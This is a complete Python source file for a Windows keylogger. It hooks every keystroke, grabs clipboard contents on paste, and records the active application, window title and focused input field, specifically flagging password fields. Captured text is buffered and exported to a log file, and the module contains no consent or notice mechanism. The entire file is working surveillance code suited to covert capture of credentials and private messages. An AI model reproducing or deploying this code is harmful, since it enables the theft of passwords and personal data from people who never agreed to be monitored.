"""Keylogger module for capturing keyboard input and clipboard.

Captures:
- Typed characters (with keyboard layout support)
- Clipboard paste (Ctrl+V)
- Focused input field information
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Optional

logger = logging.getLogger(__name__)

# Windows API constants
VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12  # Alt
VK_TAB = 0x09
VK_RETURN = 0x0D
VK_SPACE = 0x20
VK_LSHIFT = 0xA0
VK_RSHIFT = 0xA1
VK_LCONTROL = 0xA2
VK_RCONTROL = 0xA3
VK_LMENU = 0xA4
VK_RMENU = 0xA5
VK_V = 0x56
CF_UNICODETEXT = 13


@dataclass
class KeylogEntry:
    """Single keylog entry with context."""
    timestamp: str
    application: str
    window_title: str
    field_name: str  # Name/type of focused input field
    field_type: str  # Type: Edit, ComboBox, Password, etc.
    text: str
    entry_type: str = "keystroke"  # keystroke or clipboard
    
    def to_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "application": self.application,
            "window_title": self.window_title,
            "field_name": self.field_name,
            "field_type": self.field_type,
            "text": self.text,
            "entry_type": self.entry_type,
        }
    
    def to_txt_line(self) -> str:
        """Format for TXT export."""
        field_info = f"[{self.field_type}]" if self.field_type else ""
        if self.field_name:
            field_info += f" {self.field_name}"
        return f"[{self.timestamp}] {self.application} | {field_info}: {self.text}"


@dataclass
class InputBuffer:
    """Buffer for collecting keystrokes from same context."""
    application: str = ""
    window_title: str = ""
    field_name: str = ""
    field_type: str = ""
    text: str = ""
    started_at: str = ""
    last_updated: float = field(default_factory=time.time)


class FocusedElementInfo:
    """Get information about the currently focused input element."""
    
    def __init__(self):
        self._is_windows = platform.system() == "Windows"
        self._user32 = None
        self._oleacc = None
        self._automation = None
        
        if self._is_windows:
            try:
                self._user32 = ctypes.windll.user32
                self._oleacc = ctypes.windll.oleacc
            except Exception:
                pass
            
            # Try to use UI Automation for better element detection
            try:
                import comtypes.client
                self._automation = comtypes.client.CreateObject(
                    "{ff48dba4-60ef-4201-aa87-54103eef594e}",
                    interface=comtypes.gen.UIAutomationClient.IUIAutomation
                )
            except Exception:
                pass
    
    def get_focused_field(self) -> tuple[str, str]:
        """Get focused field info: (field_name, field_type).
        
        Returns:
            Tuple of (field_name, field_type) e.g. ("Email", "Edit") or ("Password", "Password")
        """
        if not self._is_windows:
            return ("", "")
        
        # Try UI Automation first (most accurate)
        if self._automation:
            try:
                return self._get_field_via_uia()
            except Exception:
                pass
        
        # Fallback to MSAA/IAccessible
        try:
            return self._get_field_via_msaa()
        except Exception:
            pass
        
        return ("", "")
    
    def _get_field_via_uia(self) -> tuple[str, str]:
        """Get field info using UI Automation."""
        try:
            import comtypes.client
            from comtypes.gen.UIAutomationClient import (
                UIA_NamePropertyId,
                UIA_ControlTypePropertyId,
                UIA_LocalizedControlTypePropertyId,
                UIA_IsPasswordPropertyId,
            )
            
            focused = self._automation.GetFocusedElement()
            if not focused:
                return ("", "")
            
            # Get field name
            name = focused.GetCurrentPropertyValue(UIA_NamePropertyId) or ""
            
            # Get control type
            control_type = focused.GetCurrentPropertyValue(UIA_LocalizedControlTypePropertyId) or ""
            
            # Check if password field
            is_password = focused.GetCurrentPropertyValue(UIA_IsPasswordPropertyId)
            if is_password:
                control_type = "Password"
            
            return (str(name), str(control_type))
        except Exception:
            return ("", "")
    
    def _get_field_via_msaa(self) -> tuple[str, str]:
        """Get field info using MSAA (IAccessible)."""
        if not self._oleacc or not self._user32:
            return ("", "")
        
        try:
            # OBJID_FOCUS = 0xFFFFFFF6
            OBJID_CARET = 0xFFFFFFF8
            
            hwnd = self._user32.GetForegroundWindow()
            if not hwnd:
                return ("", "")
            
            # Get focused child
            focus_hwnd = self._user32.GetFocus()
            if not focus_hwnd:
                focus_hwnd = hwnd
            
            # Get class name of focused control
            class_buffer = ctypes.create_unicode_buffer(256)
            self._user32.GetClassNameW(focus_hwnd, class_buffer, 256)
            class_name = class_buffer.value
            
            # Map class names to field types
            field_type = self._class_to_type(class_name)
            
            return ("", field_type)
        except Exception:
            return ("", "")
    
    def _class_to_type(self, class_name: str) -> str:
        """Map Windows class name to field type."""
        class_lower = class_name.lower()
        
        if "edit" in class_lower:
            return "Edit"
        elif "combobox" in class_lower:
            return "ComboBox"
        elif "listbox" in class_lower:
            return "ListBox"
        elif "button" in class_lower:
            return "Button"
        elif "richedit" in class_lower:
            return "RichEdit"
        elif "scintilla" in class_lower:
            return "CodeEditor"
        elif "chrome" in class_lower or "mozilla" in class_lower:
            return "Browser"
        elif class_name:
            return class_name[:20]
        
        return ""


class WindowInfo:
    """Get active window info on Windows."""
    
    def __init__(self):
        self._is_windows = platform.system() == "Windows"
        self._user32 = None
        self._kernel32 = None
        if self._is_windows:
            try:
                self._user32 = ctypes.windll.user32
                self._kernel32 = ctypes.windll.kernel32
            except Exception:
                pass
    
    def get_active_window_info(self) -> tuple[str, str]:
        """Returns (app_name, window_title)."""
        if not self._is_windows or not self._user32:
            return ("Unknown", "Unknown")
        
        try:
            hwnd = self._user32.GetForegroundWindow()
            if not hwnd:
                return ("Unknown", "Unknown")
            
            # Window title
            length = self._user32.GetWindowTextLengthW(hwnd) + 1
            buffer = ctypes.create_unicode_buffer(length)
            self._user32.GetWindowTextW(hwnd, buffer, length)
            window_title = buffer.value or "Untitled"
            
            # Process name
            pid = ctypes.c_ulong()
            self._user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            
            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
            handle = self._kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid.value)
            if handle:
                try:
                    buf = ctypes.create_unicode_buffer(1024)
                    size = ctypes.c_ulong(1024)
                    if self._kernel32.QueryFullProcessImageNameW(handle, 0, buf, ctypes.byref(size)):
                        app_name = os.path.basename(buf.value)
                    else:
                        app_name = "Unknown"
                finally:
                    self._kernel32.CloseHandle(handle)
            else:
                app_name = "Unknown"
            
            return (app_name, window_title)
        except Exception:
            return ("Unknown", "Unknown")


class KeyboardHelper:
    """Convert VK codes to characters with keyboard layout support."""
    
    def __init__(self):
        self._is_windows = platform.system() == "Windows"
        self._user32 = None
        if self._is_windows:
            try:
                self._user32 = ctypes.windll.user32
            except Exception:
                pass
    
    def vk_to_char(self, vk_code: int, scan_code: int = 0) -> Optional[str]:
        """Convert VK code to character using current keyboard layout."""
        if not self._is_windows or not self._user32:
            return None
        
        try:
            hwnd = self._user32.GetForegroundWindow()
            thread_id = self._user32.GetWindowThreadProcessId(hwnd, None)
            hkl = self._user32.GetKeyboardLayout(thread_id)
            
            keyboard_state = (ctypes.c_ubyte * 256)()
            if not self._user32.GetKeyboardState(keyboard_state):
                return None
            
            char_buffer = (ctypes.c_wchar * 5)()
            if scan_code == 0:
                scan_code = self._user32.MapVirtualKeyExW(vk_code, 0, hkl)
            
            result = self._user32.ToUnicodeEx(
                vk_code, scan_code, keyboard_state,
                char_buffer, len(char_buffer), 0, hkl
            )
            
            if result > 0:
                return char_buffer.value[:result]
            elif result < 0:
                # Dead key - clear state
                self._user32.ToUnicodeEx(
                    vk_code, scan_code, keyboard_state,
                    char_buffer, len(char_buffer), 0, hkl
                )
            return None
        except Exception:
            return None
    
    def get_clipboard_text(self) -> Optional[str]:
        """Get text from clipboard."""
        if not self._is_windows:
            return None
        
        # Try win32clipboard first
        try:
            import win32clipboard
            import win32con
            
            for _ in range(3):
                try:
                    win32clipboard.OpenClipboard()
                    try:
                        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
                            data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
                            if data:
                                return data
                    finally:
                        win32clipboard.CloseClipboard()
                    break
                except Exception:
                    time.sleep(0.05)
        except ImportError:
            pass
        
        # Fallback to ctypes
        if not self._user32:
            return None
        
        kernel32 = ctypes.windll.kernel32
        
        for _ in range(3):
            try:
                if not self._user32.OpenClipboard(None):
                    time.sleep(0.05)
                    continue
                
                try:
                    handle = self._user32.GetClipboardData(CF_UNICODETEXT)
                    if not handle:
                        break
                    
                    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
                    kernel32.GlobalLock.restype = ctypes.c_void_p
                    
                    data_ptr = kernel32.GlobalLock(handle)
                    if data_ptr:
                        try:
                            return ctypes.wstring_at(data_ptr)
                        finally:
                            kernel32.GlobalUnlock(handle)
                finally:
                    self._user32.CloseClipboard()
            except Exception:
                time.sleep(0.05)
        
        return None


class Keylogger:
    """Keylogger capturing typed characters, clipboard and field context.
    
    Captures:
    - Keyboard input (printable characters only)
    - Clipboard paste (Ctrl+V)
    - Field/input element info (where text is being entered)
    
    Usage:
        def on_entry(entry: KeylogEntry):
            print(entry.to_txt_line())
        
        kl = Keylogger(on_entry=on_entry)
        kl.start()
        # ... later ...
        kl.stop()
        
        # Export all entries to TXT
        kl.export_txt("keylog.txt")
    """
    
    # Only essential special keys that produce text
    VK_SPECIAL = {
        VK_TAB: "\t",
        VK_RETURN: "\n",
        VK_SPACE: " ",
    }
    
    # Modifier keys to ignore
    MODIFIER_NAMES = {
        "shift", "shift_l", "shift_r",
        "ctrl", "ctrl_l", "ctrl_r",
        "alt", "alt_l", "alt_r", "alt_gr",
        "cmd", "cmd_l", "cmd_r",
    }
    
    def __init__(
        self,
        on_entry: Callable[[KeylogEntry], None] | None = None,
        buffer_timeout: float = 3.0,
    ):
        """
        Args:
            on_entry: Callback when a log entry is ready
            buffer_timeout: Seconds of inactivity before flushing buffer
        """
        self._on_entry = on_entry
        self._buffer_timeout = buffer_timeout
        self._window_info = WindowInfo()
        self._field_info = FocusedElementInfo()
        self._kb_helper = KeyboardHelper()
        self._buffer = InputBuffer()
        self._buffer_lock = threading.Lock()
        self._entries: list[KeylogEntry] = []
        self._entries_lock = threading.Lock()
        self._listener = None
        self._flush_thread: threading.Thread | None = None
        self._running = False
        self._ctrl_pressed = False
    
    def start(self) -> None:
        """Start capturing keystrokes."""
        if self._running:
            return
        
        self._running = True
        
        if platform.system() == "Windows":
            try:
                from pynput import keyboard
                self._listener = keyboard.Listener(
                    on_press=self._on_key_press,
                    on_release=self._on_key_release,
                )
                self._listener.start()
            except ImportError:
                logger.warning("pynput not available")
            except Exception as e:
                logger.warning("Failed to start keyboard listener: %s", e)
        
        self._flush_thread = threading.Thread(target=self._flush_monitor, daemon=True)
        self._flush_thread.start()
    
    def stop(self) -> None:
        """Stop capturing."""
        self._running = False
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass
        self._flush_buffer(force=True)
    
    def get_entries(self) -> list[KeylogEntry]:
        """Get all captured entries."""
        with self._entries_lock:
            return list(self._entries)
    
    def clear_entries(self) -> None:
        """Clear all captured entries."""
        with self._entries_lock:
            self._entries.clear()
    
    def export_txt(self, filepath: str) -> int:
        """Export entries to TXT file.
        
        Format:
        [timestamp] Application
        Window: window_title
        Field: [field_type] field_name
        Type: keystroke/clipboard
        Text: <content>
        ----------------------------------------
        
        Args:
            filepath: Path to output file
            
        Returns:
            Number of entries exported
        """
        entries = self.get_entries()
        
        with open(filepath, "w", encoding="utf-8") as f:
            f.write("Keylog Export\n")
            f.write(f"Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total entries: {len(entries)}\n")
            f.write("=" * 60 + "\n\n")
            
            for entry in entries:
                f.write(f"[{entry.timestamp}] {entry.application}\n")
                if entry.window_title:
                    f.write(f"Window: {entry.window_title}\n")
                if entry.field_type or entry.field_name:
                    field_str = f"[{entry.field_type}]" if entry.field_type else ""
                    if entry.field_name:
                        field_str += f" {entry.field_name}"
                    f.write(f"Field: {field_str.strip()}\n")
                f.write(f"Type: {entry.entry_type}\n")
                f.write(f"Text: {entry.text}\n")
                f.write("-" * 40 + "\n")
        
        return len(entries)
    
    def _get_context(self) -> tuple[str, str, str, str]:
        """Get current context: (app, window, field_name, field_type)."""
        app_name, window_title = self._window_info.get_active_window_info()
        field_name, field_type = self._field_info.get_focused_field()
        return app_name, window_title, field_name, field_type
    
    def _context_changed(self, app: str, window: str, field_name: str, field_type: str) -> bool:
        """Check if context changed from buffer."""
        return (
            self._buffer.application != app or
            self._buffer.window_title != window or
            self._buffer.field_name != field_name or
            self._buffer.field_type != field_type
        )
    
    def _on_key_press(self, key) -> None:
        """Handle key press."""
        try:
            key_name = getattr(key, "name", None)
            if key_name:
                key_name = key_name.lower()
            key_char = getattr(key, "char", None)
            vk_code = getattr(key, "vk", None)
            scan_code = getattr(key, "_scan", 0) or 0
            
            # Track Ctrl
            if key_name in ("ctrl_l", "ctrl_r", "ctrl") or vk_code in (VK_CONTROL, VK_LCONTROL, VK_RCONTROL):
                self._ctrl_pressed = True
                return
            
            # Ignore other modifiers
            if key_name in self.MODIFIER_NAMES or vk_code in (VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_MENU, VK_LMENU, VK_RMENU):
                return
            
            # Handle Ctrl+V (paste)
            if self._ctrl_pressed:
                if vk_code == VK_V or (key_char and (key_char.lower() == "v" or key_char == "\x16")):
                    self._handle_paste()
                return  # Ignore all Ctrl+key
            
            # Get character
            char = None
            
            if vk_code is not None and platform.system() == "Windows":
                if vk_code in self.VK_SPECIAL:
                    char = self.VK_SPECIAL[vk_code]
                else:
                    char = self._kb_helper.vk_to_char(vk_code, scan_code)
            
            if char is None and key_char:
                if ord(key_char) >= 32 or key_char in ("\t", "\n", "\r"):
                    char = key_char
            
            if not char:
                return
            
            # Get context (app, window, field)
            app_name, window_title, field_name, field_type = self._get_context()
            
            with self._buffer_lock:
                if self._context_changed(app_name, window_title, field_name, field_type):
                    self._flush_buffer_locked()
                    self._buffer.application = app_name
                    self._buffer.window_title = window_title
                    self._buffer.field_name = field_name
                    self._buffer.field_type = field_type
                    self._buffer.started_at = datetime.now(timezone.utc).isoformat()
                
                self._buffer.text += char
                self._buffer.last_updated = time.time()
        
        except Exception:
            pass
    
    def _on_key_release(self, key) -> None:
        """Handle key release."""
        try:
            key_name = getattr(key, "name", None)
            if key_name:
                key_name = key_name.lower()
            vk_code = getattr(key, "vk", None)
            
            if key_name in ("ctrl_l", "ctrl_r", "ctrl") or vk_code in (VK_CONTROL, VK_LCONTROL, VK_RCONTROL):
                self._ctrl_pressed = False
        except Exception:
            pass
    
    def _handle_paste(self) -> None:
        """Handle Ctrl+V - record clipboard content with context."""
        if platform.system() != "Windows":
            return
        
        try:
            time.sleep(0.05)
            text = self._kb_helper.get_clipboard_text()
            
            if not text:
                try:
                    import pyperclip
                    text = pyperclip.paste()
                except Exception:
                    pass
            
            if not text:
                return
            
            # Get context
            app_name, window_title, field_name, field_type = self._get_context()
            
            # Create immediate entry for paste (don't buffer)
            entry = KeylogEntry(
                timestamp=datetime.now(timezone.utc).isoformat(),
                application=app_name,
                window_title=window_title,
                field_name=field_name,
                field_type=field_type,
                text=text,
                entry_type="clipboard",
            )
            
            with self._entries_lock:
                self._entries.append(entry)
            
            if self._on_entry:
                try:
                    self._on_entry(entry)
                except Exception:
                    pass
        
        except Exception:
            pass
    
    def _flush_buffer(self, force: bool = False) -> None:
        """Flush buffer to entries."""
        with self._buffer_lock:
            self._flush_buffer_locked(force)
    
    def _flush_buffer_locked(self, force: bool = False) -> None:
        """Flush buffer (must hold lock)."""
        if not self._buffer.text:
            return
        
        if not force and (time.time() - self._buffer.last_updated) < self._buffer_timeout:
            return
        
        entry = KeylogEntry(
            timestamp=self._buffer.started_at or datetime.now(timezone.utc).isoformat(),
            application=self._buffer.application or "Unknown",
            window_title=self._buffer.window_title or "Unknown",
            field_name=self._buffer.field_name,
            field_type=self._buffer.field_type,
            text=self._buffer.text,
            entry_type="keystroke",
        )
        
        with self._entries_lock:
            self._entries.append(entry)
        
        if self._on_entry:
            try:
                self._on_entry(entry)
            except Exception:
                pass
        
        self._buffer = InputBuffer()
    
    def _flush_monitor(self) -> None:
        """Periodically flush buffer."""
        while self._running:
            time.sleep(1.0)
            with self._buffer_lock:
                if self._buffer.text:
                    elapsed = time.time() - self._buffer.last_updated
                    if elapsed >= self._buffer_timeout:
                        self._flush_buffer_locked(force=True)